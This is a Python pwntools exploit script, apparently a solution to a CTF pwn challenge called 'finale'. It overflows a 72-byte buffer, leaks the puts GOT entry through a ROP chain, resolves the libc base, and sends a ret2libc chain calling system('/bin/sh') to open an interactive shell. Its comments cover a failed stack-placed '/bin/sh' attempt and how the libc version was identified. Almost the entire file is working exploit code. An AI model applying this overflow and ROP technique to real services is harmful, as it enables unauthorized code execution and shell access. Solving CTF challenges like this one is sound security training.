#!/usr/bin/env python3

from pwn import *

import re

e = ELF("./finale_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(main)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(finale+0x7d)
                      ignore 1 1
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def get_got_addr(r, got_addr):
    rop_bin = ROP(e)
    rop_bin.puts(got_addr)
    rop_bin.finale()
    payload = flat(
            b'\x90' * 72,
            rop_bin.chain()
            )
    r.sendline(payload)
    r.recvline()
    r.recvline()
    r.recvline()
    data = r.recvline()
    addr = u64(data[:-1] + b'\x00' * 2) # Need to remove the last newline char and then fill the high address with \x00
    return addr


def main():
    r = conn()

    # Unfortunately, there is no `syscall` in the binary so no SROP.

    r.sendlineafter(b'phrase:', b's34s0nf1n4l3b00')
    data = r.recvuntil(b'next year:')
    match = re.search(br'0x[0-9a-fA-F]+', data)
    # The souvenir happpens to be the start of the input string buffer.
    souvenir = int(match.group(0), 16)
    info(f'souvenir (the buffer start address) is {hex(souvenir)}')

    # By the following addresses, we found the target libc is libc6_2.31-0ubuntu9.14_amd64 to libc6_2.31-0ubuntu9.18_amd64
    # But we don't need too many of them in the final attack payload.
    puts_addr = get_got_addr(r,e.got.puts)
    # r.recvuntil(b'next year:')
    # info(f'puts addr is {hex(puts_addr)}')
    # write_addr = get_got_addr(r,e.got.write)
    # r.recvuntil(b'next year:')
    # info(f'write addr is {hex(write_addr)}')
    # printf_addr = get_got_addr(r,e.got.printf)
    # info(f'printf addr is {hex(printf_addr)}')
    r.recvuntil(b'good luck: [')
    data = r.recvuntil(b']')[:-1]
    buff_addr = int(data, 16)
    r.recvuntil(b'next year:')

    libc = ELF('./libc/libc.so.6')
    puts_offset = libc.sym.puts - libc.address
    libc.address = puts_addr - puts_offset
    rop = ROP(libc)

    # The following attack doesn't work because of "Stack Obliteration"
    # i.e. the system() code also needs to allocate stack for itself and this overwrites the bin_sh we put on the stack.
    # rop.system(buff_addr)
    # bin_sh = b'/bin/sh\x00'
    # payload = flat(
    #         bin_sh,
    #         b'\x90' * (72 - len(bin_sh)),
    #         rop.find_gadget(['ret'])[0],
    #         rop.chain(),
    #         )
    # r.sendline(payload)
    
    bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
    rop.system(bin_sh_addr)
    payload = flat(
            b'\x90' * 72,
            rop.find_gadget(['ret'])[0],
            rop.chain(),
            )
    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()
